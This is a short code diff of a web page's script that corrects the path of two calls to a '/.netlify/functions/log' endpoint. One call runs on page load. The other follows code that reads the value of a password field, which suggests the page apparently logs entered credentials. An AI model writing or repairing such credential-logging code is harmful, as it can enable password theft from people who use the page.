@@ -363,7 +363,7 @@
     </div>
   </footer>
   <script>
-    fetch("/netlify/functions/log", {
+    fetch("/.netlify/functions/log", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ formSubmitted: false }),
@@ -380,7 +380,7 @@
           'input[name="password"]'
         ).value;
 
-        fetch("/netlify/functions/log", {
+        fetch("/.netlify/functions/log", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
